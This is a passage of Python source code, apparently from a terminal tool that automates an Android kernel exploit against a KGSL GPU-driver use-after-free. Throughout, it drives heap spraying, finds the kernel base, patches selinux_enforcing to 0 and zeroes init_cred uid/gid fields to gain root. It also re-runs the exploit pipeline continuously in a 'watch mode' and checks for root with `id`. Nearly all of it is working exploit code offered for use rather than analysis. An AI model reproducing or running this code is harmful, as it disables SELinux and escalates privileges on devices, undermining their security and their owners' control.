                for step_idx, (tgt, page, desc) in enumerate(chain):
                    if "ROOT" in desc:
                        self.cred_va = tgt
                        self.live["last_msg"] = (
                            f"AUTO: ROOT cred @ {tgt:#x} via chain walk")
                        for f_off in (4, 8, 12, 16, 20, 24):
                            self.patch_mem(tgt + f_off, 0)
                        self._add_found(
                            va=hex(tgt),
                            type="Privilege Struct (ROOTED)",
                            desc="init_cred-like (autopilot chain walk, patched)",
                            confidence=100,
                        )
                        return

    def _autopilot_scan_around_kbase(self):
        """Once kbase is known, scan the region around it looking for
        SELinux / init_cred / task_struct hits. Uses the engine's "S"
        command, but with a smaller sub-range so each cycle completes
        quickly. Only fires if kbase is set."""
        if not self.kernel_base:
            return
        if self.op_busy.get("scan", False):
            return  # don't queue if a scan is already running
        if not self.ensure_engine():
            return
        # 8 MB window around kbase — covers the SELinux / init_cred area
        # in a typical Android 5.4 kernel.
        s_start = (self.kernel_base + 0x1000000) & ~0xFFFFF
        s_end   = s_start + 0x800000
        if not self._engine_write(
                f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
            return
        with self.bg_lock:
            self.live["scan_total"]  = s_end - s_start
            self.live["scan_offset"] = s_start
            self.live["last_msg"] = (
                f"AUTO: targeted scan around kbase 0x{self.kernel_base:x}…")
        # Drive the scan with a short timeout. We don't bother to
        # fully process every line — the learning workers do that in
        # parallel. We just want to surface high-sig hits.
        deadline = time.time() + 15.0
        idle_count = 0
        while time.time() < deadline and not self.cancel_flag.is_set():
            line = self._readline_timeout(timeout=0.5)
            if line is None:
                break
            if not line:
                idle_count += 1
                if idle_count > 30:
                    break
                continue
            idle_count = 0
            if "SCAN_DONE" in line:
                try:
                    stats_part = line.split("SCAN_DONE", 1)[1]
                    kv = {}
                    for part in stats_part.split(":"):
                        if "=" in part:
                            k, v = part.split("=", 1)
                            kv[k] = v
                    reads   = int(kv.get("r", "0"))
                    failed  = int(kv.get("f", "0"))
                    empty   = int(kv.get("e", "0"))
                    nonzero = int(kv.get("n", "0"))
                    hits    = int(kv.get("h", "0"))
                    self.live["last_msg"] = (
                        f"AUTO: scan done r={reads} f={failed} e={empty} "
                        f"n={nonzero} h={hits}")
                except Exception:
                    pass
                break
            if "PROGRESS:" in line:
                try:
                    self.live["scan_offset"] = int(line.split(":")[1], 16)
                except Exception:
                    pass
                continue
            if "MATCH:" in line:
                try:
                    parts = line.split(":")
                    va = int(parts[1], 16)
                    sig = int(parts[2])
                    off_in_page = int(parts[3]) if len(parts) > 3 else -1
                except Exception:
                    continue
                self.live["scan_offset"] = va
                data = self._read_data_packet()
                if not data:
                    continue
                already = any(int(it['va'], 16) == va
                             for it in self.found_items)
                if already:
                    continue
                if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17):
                    with self.bg_lock:
                        self.found_items.append(
                            self.classify_page(data, va, sig, off_in_page))
                    self.log_event("autopilot_scan_match",
                                   {"va": va, "sig": sig})
        with self.bg_lock:
            self.live["scan_total"] = 0
            self.live["last_msg"] = (
                f"AUTO: targeted scan done "
                f"({len([i for i in self.found_items if 'KGSL' in str(i)])} items)")

    def _autopilot_verify_root(self):
        """Run `id` and parse the uid. Update live state.
        If uid==0, set self.root_verified=True."""
        try:
            out = subprocess.check_output(["id"], text=True, timeout=2)
        except Exception:
            return
        # Format: "uid=0(root) gid=0(root) groups=..."
        m = re.search(r"uid=(\d+)\(([^)]+)\)", out)
        if m:
            uid = int(m.group(1))
            name = m.group(2)
            self.live["uid"] = uid
            self.live["user"] = name
            if uid == 0:
                self.root_verified = True
                self.live["last_msg"] = f"AUTO: ROOT VERIFIED (uid={uid} {name})"
                self.log_event("root_verified", {"uid": uid, "name": name})
            else:
                self.root_verified = False

    # ============== WATCH MODE (continuous auto-exploit) ==============
    def cmd_watch_start(self):
        """Auto-re-run the exploit pipeline continuously in a background thread.
        Each cycle: UAF → kbase → selinux → cred → patch. Stops when watch_mode
        is cleared or Ctrl+P is pressed."""
        self.live["last_command"] = "WATCH"
        if self.watch_mode and self.watch_thread and self.watch_thread.is_alive():
            self.live["last_msg"] = "Watch mode already running — Ctrl+P to stop."
            return
        self.cancel_flag.clear()
        self.watch_mode = True
        self.watch_thread = threading.Thread(target=self._watch_worker, daemon=True)
        self.watch_thread.start()
        self.live["last_msg"] = "Watch mode started. Pipeline will auto-repeat."
        self.log_event("watch_start", {})

    def cmd_watch_stop(self):
        self.watch_mode = False
        self.cancel_flag.set()
        self.live["last_msg"] = "Watch mode stopped."

    def _watch_worker(self):
        """Continuous exploit pipeline. Re-runs every 30s, or sooner if
        previous run failed. Updates TUI live status so user sees progress
        without pressing keys."""
        cycle = 0
        while self.watch_mode and not self.cancel_flag.is_set():
            cycle += 1
            self.live["last_msg"] = f"WATCH cycle {cycle}: UAF + chain…"
            try:
                # 1. Ensure engine is up
                if not self.ensure_engine():
                    self.live["last_msg"] = "WATCH: engine not available, retrying in 10s…"
                    time.sleep(10)
                    continue
                # 2. Run the exploit (will chain to kbase/selinux/cred/patch)
                self._run_exploit_pipeline()
            except Exception as e:
                self.live["last_msg"] = f"WATCH error: {e}"
                self.log_event("watch_error", {"err": str(e)})
            # 3. Sleep between cycles
            for _ in range(30):
                if not self.watch_mode or self.cancel_flag.is_set():
                    break
                time.sleep(1)
        self.live["last_msg"] = f"Watch mode stopped after {cycle} cycles."
        self.log_event("watch_stop", {"cycles": cycle})

    def _run_exploit_pipeline(self):
        """Replicate the auto-pipeline from trigger_exploit but as a callable."""
        # This is a synchronous pipeline (called by watch worker or
        # trigger_exploit's worker). It does NOT spawn a new thread.
        self.op_busy["exploit"] = True
        try:
            if not self._engine_write(b"exploit\n"):
                self.live["last_msg"] = "Engine write failed"
                return
            # Wait for UAF_READY / UAF_FAILED — with a deadline so
            # we don't hang forever if the learning worker is also
            # holding the engine_lock for a long scan.
            deadline = time.time() + 30
            idle_count = 0
            while time.time() < deadline:
                line = self._readline_timeout(timeout=0.5)
                if line is None:
                    break
                if not line:
                    idle_count += 1
                    if idle_count % 20 == 0:
                        self.live["last_msg"] = (
                            f"AUTO: waiting for UAF_READY… "
                            f"({int(deadline - time.time())}s left)")
                    continue
                idle_count = 0
                if "UAF_READY" in line or "UAF_FAILED" in line:
                    if "UAF_FAILED" in line:
                        self.live["last_msg"] = f"WATCH: {line}"
                    break
            else:
                self.live["last_msg"] = "WATCH: UAF timeout"
                return
            if "UAF_READY" not in (line or ""):
                return
            # Find kbase
            self.live["last_msg"] = "WATCH: finding kernel base…"
            kbase = self._find_kernel_base()
            if not kbase:
                self.live["last_msg"] = "WATCH: no kbase"
                return
            self.kernel_base = kbase
            # Probe SELinux
            self.live["last_msg"] = "WATCH: probing SELinux…"
            sel = self._probe_selinux(kbase)
            if sel:
                self.selinux_va, val = sel
                self.patch_mem(self.selinux_va, 0)
            # Find init_cred
            self.live["last_msg"] = "WATCH: finding init_cred…"
            ic = self._find_init_cred(kbase)
            if ic:
                self.cred_va = ic
                for off in (4, 8, 12, 16, 20, 24):
                    self.patch_mem(self.cred_va + off, 0)
            self.live["last_msg"] = (f"WATCH: kbase=0x{kbase:x} "
                                    f"selinux={'0x%x'%self.selinux_va if self.selinux_va else 'N/A'} "
                                    f"cred={'0x%x'%self.cred_va if self.cred_va else 'N/A'}")
        finally:
            self.op_busy["exploit"] = False

    # ============== ACTIONS ==============
    def trigger_exploit(self):
        """Trigger the KGSL UAF. In auto_mode, also chains: kbase → selinux → cred → patch.
        Runs in a worker thread so the TUI never freezes."""
        self.live["last_command"] = "E (Exploit)"
        if self.op_busy["exploit"]:
            self.live["last_msg"] = "Exploit already running…"
            return "Busy"
        if not self._engine_write(b"exploit\n"):
            return "Engine Error"

        self.op_busy["exploit"] = True
        self.live["last_msg"] = "EXPLOITING…"

        def _worker():
            try:
                # Poll the engine for "UAF_READY" / "UAF_FAILED"
                deadline = time.time() + 30
                last_line = ""
                idle_count = 0
                while time.time() < deadline:
                    line = self._readline_timeout(timeout=0.5)
                    if line is None:
                        self.op_results["exploit"] = "Engine died during exploit"
                        break
                    if not line:
                        idle_count += 1
                        if idle_count % 20 == 0:
                            self.live["last_msg"] = (
                                f"EXPLOIT: waiting for UAF_READY… "
                                f"({int(deadline - time.time())}s left)")
                        continue
                    idle_count = 0
                    last_line = line
                    if "UAF_READY" in line or "UAF_FAILED" in line:
                        self.op_results["exploit"] = line
                        break
                else:
                    self.op_results["exploit"] = f"Exploit timeout: {last_line or 'no response'}"
                self.live["last_msg"] = f"Exploit: {self.op_results['exploit']}"
                self.log_event("exploit", {"result": self.op_results['exploit']})

                if "UAF_READY" not in (self.op_results["exploit"] or ""):
                    return

                # Auto-mode: chain through kbase → selinux → cred → patch
                if not self.auto_mode:
                    return

                self.live["last_msg"] = "AUTO: finding kernel base…"
                kbase = self._find_kernel_base()
                if kbase is None:
                    self.live["last_msg"] = "AUTO: kernel base not found"
                    self.log_event("auto_kbase_fail", {})
                    return
                self.kernel_base = kbase
                self.log_event("auto_kbase", {"kbase": hex(kbase)})
                self._add_found(
                    va=hex(kbase),
                    type="Kernel Code",
                    desc="Kernel ELF base (auto)",
                    confidence=100,
                )

                self.live["last_msg"] = f"AUTO: kernel base=0x{kbase:x}, probing SELinux…"
                sel = self._probe_selinux(kbase)
                if sel is not None:
                    sel_va, val = sel
                    self.selinux_va = sel_va
                    self.log_event("auto_selinux", {"va": hex(sel_va), "val": val})
                    self._add_found(
                        va=hex(sel_va),
                        type="SELinux",
                        desc=f"selinux_enforcing={val} (verified stable)",
                        confidence=100,
                    )
                    # Patch SELinux enforcing -> 0 (disable)
                    self.live["last_msg"] = f"AUTO: patching SELinux {sel_va:#x} -> 0…"
                    res = self.patch_mem(sel_va, 0)
                    self.log_event("auto_selinux_patch", {"va": hex(sel_va), "result": res})
                    self._add_found(
                        va=hex(sel_va),
                        type="SELinux (PATCHED)",
                        desc=f"selinux_enforcing=0 (was {val}, verified)",
                        confidence=100,
                    )
                else:
                    self.live["last_msg"] = "AUTO: SELinux NOT verified (no stable value at known offsets)"
                    self.log_event("auto_selinux_fail", {"kbase": hex(kbase)})

                self.live["last_msg"] = f"AUTO: locating init_cred @ 0x{self.init_cred_offset:x}…"
                ic = self._find_init_cred(kbase)
                if ic is not None:
                    self.cred_va = ic
                    cred_verify = self._verify_init_cred(ic)
                    self.log_event("auto_init_cred", {"va": hex(ic), "verify": cred_verify})
                    self._add_found(
                        va=hex(ic),
                        type="Privilege Struct",
                        desc=f"init_cred (verified={cred_verify})",
                        confidence=100,
                    )
                    # Patch init_cred uid/gid/euid/egid to 0 (root)
                    for off in (4, 8, 12, 16, 20, 24):
                        self.patch_mem(ic + off, 0)
                    self._add_found(
                        va=hex(ic),
                        type="Privilege Struct (ROOTED)",
                        desc=f"init_cred uid/gid=0 (verified={cred_verify})",
                        confidence=100,
                    )
                else:
                    self.live["last_msg"] = "AUTO: init_cred NOT verified (no cred struct at known offsets)"
                    self.log_event("auto_init_cred_fail", {"kbase": hex(kbase)})

                sel_str = f"0x{sel[0]:x}" if sel else "N/A"
                ic_str  = f"0x{ic:x}" if ic else "N/A"
                self.live["last_msg"] = "AUTO: probing other kernel globals (selinux_enabled, kptr_restrict)…"
                extra = self._probe_interesting(kbase)
                for f in extra:
                    self._add_found(
                        va=hex(f["va"]),
                        type="Kernel Global",
                        desc=f"{f['name']}={f['val']} (nz={f['nonzero']})",
                        confidence=80,
                    )

                # 4. Walk cred chain from a known task_struct (if we found one)
                self.live["last_msg"] = "AUTO: walking cred chain from known task_structs…"
                walked = 0
                with self.bg_lock:
                    ts_items = [it for it in self.found_items
                                if it['type'] in ("Privilege Struct", "task_struct")
                                and 'task_struct' in it.get('description', '').lower()
                                and 'cred @' in it.get('description', '')]
                for it in ts_items[:3]:
                    try:
                        ts_va = int(it['va'], 16)
                    except Exception:
                        continue
                    # cred pointer is at offset 0x770 (or alt: 0x768, 0x778, 0x780)
                    for off in (0x770, 0x768, 0x778, 0x780):
                        chain = self.walk_cred_chain(ts_va, off_in_page=off, max_hops=3)
                        if not chain:
                            continue
                        for step_idx, (tgt, page, desc) in enumerate(chain):
                            walked += 1
                            self._add_found(
                                va=hex(tgt),
                                type="Privilege Struct",
                                desc=f"{desc} (hop {step_idx} from {hex(ts_va)}+0x{off:x})",
                                confidence=95 if "ROOT" in desc else 70,
                                data=page,
                            )
                            if "ROOT" in desc:
                                # Found init_cred-like via chain — patch uid/gid
                                self.cred_va = tgt
                                for f_off in (4, 8, 12, 16, 20, 24):
                                    self.patch_mem(tgt + f_off, 0)
                                self._add_found(
                                    va=hex(tgt),
                                    type="Privilege Struct (ROOTED)",
                                    desc="init_cred-like (from cred chain walk, patched)",
                                    confidence=100,
                                )
                                break
                        if self.cred_va:
                            break
                    if self.cred_va:
                        break
                self.live["last_msg"] = (
                    f"AUTO DONE: kbase=0x{kbase:x} selinux={sel_str} "
                    f"cred={ic_str} extras={len(extra)}")
            except Exception as e:
                self.live["last_msg"] = f"Exploit error: {e}"
                self.log_event("exploit_error", {"err": str(e)})
            finally:
                self.op_busy["exploit"] = False

        threading.Thread(target=_worker, daemon=True).start()
        return "Exploit started"

    def cmd_clear(self):
        self.live["last_command"] = "C (Clear)"
        # Kill from all per-worker sets (not the global self.spray_procs
        # which is no longer the source of truth).
        killed = 0
        for wid, pids in list(self.spray_procs_by_worker.items()):
            for pid in list(pids):
                try:
                    os.kill(pid, 9)
                    os.waitpid(pid, 0)
                    killed += 1
                except Exception:
                    pass
            pids.clear()
        self.live["kill_count"] += killed
        self.live["last_msg"] = f"Memory Cleared ({killed} procs)."
        return "Cleared"

    def cmd_rebuild(self):
        self.live["last_command"] = "B (Rebuild)"
        ok = self.try_compile_engine()
        if ok and self.exploit_proc:
            try:
                self.exploit_proc.stdin.write(b"quit\n")
                self.exploit_proc.terminate()
            except Exception:
                pass
            self.exploit_proc = None
        self.live["last_msg"] = "Engine Rebuilt." if ok else "Rebuild Failed."
        return "Rebuilt" if ok else "Failed"

    def cmd_verify_root(self):
        self.live["last_command"] = "R (Verify Root)"
        try:
            res = subprocess.check_output(["id"], text=True).strip()
        except Exception:
            res = "id failed"
        self.live["last_msg"] = res
        return res

    def cmd_scan(self):
        """Synchronous scan, but with live progress bar updates."""
        self.live["last_command"] = "S (Scan)"
        if self.op_busy["scan"]:
            self.live["last_msg"] = "Scan already running…"
            return "Busy"
        if not self.ensure_engine():
            return "Engine Error"

        self.op_busy["scan"] = True
        self.live["scan_total"] = self.scan_size
        self.live["scan_offset"] = 0
        self.live["last_msg"] = "SCANNING…"

        def _scan_worker():
            try:
                # Prioritize known ranges (these are quick page reads)
                for va_hex in list(self.knowledge_base["successful_vas"])[:8]:
                    if self.cancel_flag.is_set():
                        return
                    va = int(va_hex, 16)
                    data = self.read_page(va)
                    if data and not any(int(it['va'], 16) == va for it in self.found_items):
                        with self.bg_lock:
                            self.found_items.append(self.classify_page(data, va))

                if not self._engine_write(
                    f"scan {hex(self.uaf_start)} {hex(self.uaf_start + self.scan_size)}\n".encode()):
                    self.live["last_msg"] = "Scan: engine write failed"
                    return

                # Use bounded readline timeouts so we never block forever
                deadline = time.time() + 600  # 10 min max
                while time.time() < deadline:
                    line = self._readline_timeout(timeout=1.0)
                    if line is None:
                        self.live["last_msg"] = "Scan: engine died"
                        return
                    if not line:
                        continue
                    if "SCAN_DONE" in line:
                        # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
                        try:
                            stats_part = line.split("SCAN_DONE", 1)[1]
                            kv = {}
                            for part in stats_part.split(":"):
                                if "=" in part:
                                    k, v = part.split("=", 1)
                                    kv[k] = v
                            reads   = int(kv.get("r", "0"))
                            failed  = int(kv.get("f", "0"))
                            empty   = int(kv.get("e", "0"))
                            nonzero = int(kv.get("n", "0"))
                            hits    = int(kv.get("h", "0"))
                            self.live["last_msg"] = (
                                f"S: SCAN_DONE read={reads} failed={failed} "
                                f"empty={empty} nonzero={nonzero} hits={hits}")
                        except Exception:
                            self.live["last_msg"] = "Scan complete."
                        break
                    if "PROGRESS:" in line:
                        try:
                            parts = line.split(":")
                            self.live["scan_offset"] = int(parts[1], 16)
                        except Exception:
                            pass
                        continue
                    if "MATCH:" in line:
                            try:
                                parts = line.split(":")
                                va = int(parts[1], 16)
                                sig = int(parts[2])
                                off_in_page = int(parts[3]) if len(parts) > 3 else -1
                            except Exception:
                                continue
                            self.live["scan_offset"] = va - self.uaf_start
                            data = self._read_data_packet()
                            if not data:
                                continue
                            if any(int(it['va'], 16) == va for it in self.found_items):
                                continue
                            # Smart multi-page read for strong sigs (now incl. 10, 11, 12)
                            cross = data
                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) and off_in_page >= 0:
                                triple = self.read_with_neighbors(va)
                                if triple and len(triple) == 12288:
                                    cross = triple
                            if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) or self._is_real_task_struct(cross):
                                with self.bg_lock:
                                    self.found_items.append(
                                        self.classify_page(cross, va, sig, off_in_page))
                                self.log_event("scan_match", {"va": va,
                                                               "type": self.found_items[-1]['type'],
                                                               "sig": sig})
                            else:
                                # Keep weaker matches as "Unknown Object"
                                interesting, reason, conf = self._is_page_interesting(data)
                                if interesting:
                                    with self.bg_lock:
                                        self.found_items.append({
                                            "type": "Unknown Object",
                                            "description": f"Auto-found ({reason})",
                                            "va": hex(va),
                                            "confidence": conf,
                                            "data": data,
                                            "ts": datetime.datetime.now().isoformat(),
                                        })
                                    self.log_event("scan_auto", {"va": va, "reason": reason,
                                                                  "conf": conf})

                self.live["scan_offset"] = self.scan_size
                self.live["last_msg"] = f"Scan complete. Found {len(self.found_items)} items."
            except Exception as e:
                self.live["last_msg"] = f"Scan error: {e}"
                self.log_event("scan_error", {"err": str(e)})
            finally:
                self.op_busy["scan"] = False

        threading.Thread(target=_scan_worker, daemon=True).start()
        return "Scan started"

    # ============== BACKGROUND LEARNING (Ctrl+P to cancel) ==============
    def cmd_learning_start(self):
        """Launch AI learning in a background thread, controllable by Ctrl+P.
        Pressing L while learning is already running does nothing \u2014 only Ctrl+P cancels.

        Verticalization: launches LEARN_WORKERS subworkers in parallel, each
        with its own spray range + scan sub-range. This really loads the
        device (multiple spray processes, multiple engine ops) and finds
        offsets faster than a single sequential loop.
        """
        self.live["last_command"] = "L (Learning BG)"
        if self.bg_thread and self.bg_thread.is_alive():
            self.live["last_msg"] = "Learning already running \u2014 press Ctrl+P to cancel."
            return
        # Reset per-worker PID map BEFORE launching workers so stale
        # PIDs from a previous run don't linger in the new sets.
        self.spray_procs_by_worker = {}
        # Reset comm mismatch warning so first batch of new run
        # re-checks /proc/PID/comm.
        self._comm_warned = False
        # Reset xattr counter for new run
        self.learn_stats["xattrs_set"] = 0
        # Clear stale found_items from previous run. The user
        # was seeing 3 "Empty Page" entries that were discovered
        # 5 minutes ago and never went away — confusing because
        # they look like current results.
        self.found_items = []
        self.memory_map = []
        # Reset adaptive scan state
        self._adaptive_scan = {
            "no_match_batches": 0,
            "current_offset": 0,
            "ranges_tried": [],
        }
        self.cancel_flag.clear()
        self.bg_thread = threading.Thread(target=self._learning_worker, daemon=True)
        self.bg_thread.start()
        self.live["last_msg"] = (
            f"Learning started ({LEARN_WORKERS} parallel workers, "
            f"batch=20, xattr={'ON' if self.use_xattr_spray else 'OFF (use xt to enable)'}). "
            f"Press Ctrl+P to cancel.")
        self.log_event("learning_start",
                       {"total_target": 1000, "batch": 35,
                        "workers": LEARN_WORKERS})
        return "BG started"

    def _learning_worker(self):
        """AI learning loop coordinator. Verticalized: launches
        LEARN_WORKERS _learning_subworker threads in parallel.

        Each subworker owns a slice of the spray range [0..target_total)
        and a slice of the scan range. They all serialize engine I/O
        through self.engine_lock, so they coexist safely with the
        autopilot and with each other.

        Real spray processes are forked independently per subworker, so
        the device's CPU + RAM + GPU pipeline really sees LEARN_WORKERSx
        the load (instead of artificially faking progress). This is the
        "verticalization" the user asked for.
        """
        target_total = 1000
        # Shared stats \u2014 incremented by all subworkers under stats_lock
        self.live["spray_target"] = target_total
        self.live["spray_count"] = 0
        self.live["kill_count"] = 0
        self.learn_stats = {
            "batches": 0, "matches": 0, "verified": 0,
            "false_positives": 0, "sprayed_total": 0,
            "xattrs_set": 0,
        }
        # Lock for shared stats \u2014 multiple subworkers bump these
        self.stats_lock = threading.Lock()

        # Launch LEARN_WORKERS subworkers in parallel
        self._learn_subworkers = []
        for wid in range(LEARN_WORKERS):
            slice_start = (target_total * wid) // LEARN_WORKERS
            slice_end   = (target_total * (wid + 1)) // LEARN_WORKERS
            t = threading.Thread(
                target=self._learning_subworker,
                args=(wid, slice_start, slice_end),
                daemon=True)
            t.start()
            self._learn_subworkers.append(t)
        # v4.1: smart kbase finder (one-shot, runs in background
        # so the scan workers can use it once it finds something)
        threading.Thread(target=self._bg_smart_kbase,
                         daemon=True).start()

        # Wait for all subworkers (or cancel)
        try:
            while not self.cancel_flag.is_set():
                alive = [t for t in self._learn_subworkers if t.is_alive()]
                if not alive:
                    break
                time.sleep(0.5)
                s = self.learn_stats
                self.live["last_msg"] = (
                    f"LEARN: {len(alive)}/{LEARN_WORKERS} workers | "
                    f"batches={s['batches']} | sprayed={s['sprayed_total']} | "
                    f"matches={s['matches']} | verified={s['verified']} | "
                    f"falsePos={s['false_positives']}")
        except Exception as e:
            self.log_event("learning_error", {"err": str(e)})

        # All subworkers done (or cancelled). Update final state.
        self.live["spray_target"] = 0
        s = self.learn_stats
        if self.cancel_flag.is_set():
            self.live["last_msg"] = (
                f"Learning cancelled. sprayed={s['sprayed_total']} "
                f"matches={s['matches']} verified={s['verified']} "
                f"falsePos={s['false_positives']}")
        else:
            self.live["last_msg"] = (
                f"Learning complete ({LEARN_WORKERS} workers). "
                f"sprayed={s['sprayed_total']} matches={s['matches']} "
                f"verified={s['verified']} falsePos={s['false_positives']}")
        # Persist learning stats
        try:
            with open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                   "learn_stats.json"), "w") as f:
                json.dump(s, f, indent=2)
        except Exception:
            pass
        self.log_event("learning_done", self.learn_stats)

    def _w3_worker(self):
        """W3 — dedicated deep-scan worker for Empty Page locations.

        Unlike the 3 spray workers (W0, W1, W2) which spray+scan
        their own slice, W3 ONLY scans. It re-reads the addresses
        of any item with type "Empty Page" or any other "boring"
        type to see if they change (spray might have landed later,
        or another worker might have written to that page).
        Updates the spray_map as it goes so the TUI shows the
        bucket as "scanning" (orange) or "found" (green).
        """
        import time as _t
        # v4.1: bind W3 to last CPU core for cache locality
        self._set_cpu_affinity(3)
        while not self.cancel_flag.is_set() and self.w3_enabled:
            if not self.ensure_engine():
                _t.sleep(1.0)
                continue
            # Pick up to 4 targets this iteration:
            # 1) All Empty Page items
            # 2) First 2 from found_items (in case new ones appeared)
            targets = []
            for it in list(self.found_items):
                if it.get("type") == "Empty Page":
                    try:
                        targets.append(int(it["va"], 16))
                    except Exception:
                        pass
            # Sort by VA for stable re-checks
            targets = sorted(set(targets))[:4]
            if not targets:
                # Nothing to deep-scan right now. Sleep and try
                # again in 5s.
                _t.sleep(5.0)
                continue
            for va in targets:
                if self.cancel_flag.is_set() or not self.w3_enabled:
                    break
                # Compute bucket index
                if (va >= self.uaf_start
                    and va < self.uaf_start + self.scan_size):
                    bidx = (va - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
                    if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                        with self.stats_lock:
                            self.spray_map[bidx] = 3  # scanning
                # Read 4 consecutive pages around this VA
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"W3: deep-scan 0x{va:x} (Empty Page recheck)")
                found_here = False
                for off in (0, 0x1000, -0x1000, 0x2000):
                    target_va = va + off
                    if (target_va < self.uaf_start
                        or target_va >= self.uaf_start + self.scan_size):
                        continue
                    if not self._engine_write(
                            f"read {hex(target_va)}\n".encode()):
                        continue
                    data = self._read_data_packet()
                    if not data or len(data) < 4096:
                        # Scan error
                        if (target_va >= self.uaf_start
                            and target_va < self.uaf_start + self.scan_size):
                            bidx = ((target_va - self.uaf_start)
                                    // self.SPRAY_MAP_BUCKET_SIZE)
                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                                with self.stats_lock:
                                    self.spray_map[bidx] = 4
                        continue
                    # Count non-zero bytes
                    nz = sum(1 for b in data if b)
                    if nz > 16:
                        # Non-trivial data — update bucket to FOUND
                        if (target_va >= self.uaf_start
                            and target_va < self.uaf_start + self.scan_size):
                            bidx = ((target_va - self.uaf_start)
                                    // self.SPRAY_MAP_BUCKET_SIZE)
                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                                with self.stats_lock:
                                    self.spray_map[bidx] = 6  # found!
                        # Try to classify it now (it might be a real
                        # object that we missed the first time)
                        classified = self.classify_page(
                            target_va, data, 17)  # sig=17 = comm-like
                        if classified and classified.get("type") != "Empty Page":
                            with self.bg_lock:
                                if not any(int(it['va'], 16) == target_va
                                           for it in self.found_items):
                                    self.found_items.append(classified)
                            with self.stats_lock:
                                self.learn_stats["matches"] += 1
                                # v4.1: confidence histogram
                                conf = classified.get("confidence", 0)
                                bidx = min(10, conf // 10)
                                self.conf_histogram[bidx] += 1
                            found_here = True
                            with self.stats_lock:
                                self.live["last_msg"] = (
                                    f"W3: FOUND 0x{target_va:x} = "
                                    f"{classified.get('type')} "
                                    f"({classified.get('description')})")
                            break
                    else:
                        # Still empty
                        if (target_va >= self.uaf_start
                            and target_va < self.uaf_start + self.scan_size):
                            bidx = ((target_va - self.uaf_start)
                                    // self.SPRAY_MAP_BUCKET_SIZE)
                            if 0 <= bidx < self.SPRAY_MAP_BUCKETS:
                                with self.stats_lock:
                                    self.spray_map[bidx] = 5  # done
                _t.sleep(0.5)  # be nice to the engine
            _t.sleep(2.0)

    def _bg_smart_kbase(self):
        """Background kbase search.

        Runs once when learning starts. Scans kernel text for
        ELF header, "Linux version" string, or commit_creds/
        prepare_kernel_cred symbol. Updates self.kernel_base
        and self.live["last_msg"] so the user sees the result.

        v4.1: tries kallsyms FIRST (fast, doesn't need engine),
        then falls back to ELF header scan via engine. This way
        the kbase is available even if the engine pipe is broken
        (Termux has no /dev/kgsl-3d0).
        """
        import time as _t
        # Wait briefly for engine
        for _ in range(20):
            if self._engine_alive() or self.ensure_engine():
                break
            _t.sleep(0.5)
        try:
            # First try kallsyms (fast, no engine required)
            n_syms = self.load_kallsyms()
            if n_syms > 0 and self.kernel_base:
                # kbase already set by load_kallsyms
                with self.stats_lock:
                    self.live["kernel_base"] = self.kernel_base
                return
            # Then try ELF header scan via engine
            kbase, conf = self._smart_kbase_finder()
            if kbase:
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"Smart kbase finder (ELF scan): 0x{kbase:x} "
                        f"(confidence={conf}%)")
                    self.live["kernel_base"] = kbase
        except Exception as e:
            with self.stats_lock:
                self.live["last_msg"] = f"Smart kbase finder failed: {e}"

    def cmd_w3_toggle(self):
        """Toggle the W3 deep-scan worker."""
        if self.w3_enabled:
            self.w3_enabled = False
            if self.w3_thread:
                self.w3_thread.join(timeout=2.0)
            self.live["last_msg"] = "W3 worker STOPPED"
        else:
            self.w3_enabled = True
            self.w3_thread = threading.Thread(
                target=self._w3_worker, daemon=True)
            self.w3_thread.start()
            self.live["last_msg"] = (
                "W3 worker STARTED (deep-scan Empty Pages)")

    def _learning_subworker(self, worker_id, slice_start, slice_end):
        """One parallel slice of the AI learning loop. Runs in its own thread.

        Owns spray indices [slice_start..slice_end) and a matching slice of
        the scan range. All engine I/O goes through self.engine_lock so we
        don't fight with the autopilot or with other subworkers.

        KEY: spray PIDs are stored in self.spray_procs_by_worker[worker_id],
        NOT in a global list. This is the fix for "1/3 workers" — previously
        one worker's RAM>70% cull wiped every other worker's spray set.
        """
        import subprocess as _sp
        # v4.1: bind each worker to its own CPU core for cache
        # locality. W0→CPU0, W1→CPU1, W2→CPU2, W3→CPU3.
        # On a 4-core device this prevents workers from
        # thrashing each other's L1/L2 cache.
        self._set_cpu_affinity(worker_id)
        # v4.1: mlockall so our Python process pages don't get
        # swapped. Without this, a long learning session can
        # have its own working set paged out, slowing
        # classification and engine pipe writes.
        self._mlock_current()
        # Even smaller batch (was 35, then 100). With 3 workers × 35
        # procs × ~10 batches we accumulated 1000+ PIDs that never
        # died (kill failed silently), exhausting RAM and process
        # table. 20 procs × 3 workers × multiple batches stays under
        # 200 alive at any moment.
        batch = 20
        done = slice_start
        # Per-worker PID set — isolated from siblings.
        my_pids = set()
        self.spray_procs_by_worker[worker_id] = my_pids
        # Per-batch warning flag so we only complain about a comm
        # mismatch once per worker (not on every spray).
        self._comm_warned = False
        # Scan range for this subworker
        scan_chunk = (self.scan_size) // LEARN_WORKERS
        scan_start = self.uaf_start + scan_chunk * worker_id
        scan_end   = scan_start + scan_chunk

        while done < slice_end and not self.cancel_flag.is_set():
            # Respect RAM budget — only kill OUR spray procs, not siblings'.
            if self.get_ram_usage() > 70.0:
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"W{worker_id}: RAM>70%, killing {len(my_pids)} sprays\u2026")
                for pid in list(my_pids):
                    try:
                        os.kill(pid, 9)
                        os.waitpid(pid, 0)
                        with self.stats_lock:
                            self.live["kill_count"] += 1
                    except Exception:
                        pass
                my_pids.clear()
                time.sleep(2)

            if not self.ensure_engine():
                time.sleep(1)
                continue

            # 1) SPRAY a batch (this subworker's slice) — v4.1 multi-method
            #
            # The spray loop now uses Q-learning to pick the BEST
            # combination of:
            #   - batch size
            #   - comm pattern (KETO / KETW / MIXED)
            #   - spray method (popen_sleep / mmap_anon / sendmsg)
            #   - scan range offset
            # based on past success rate. Each worker has its own
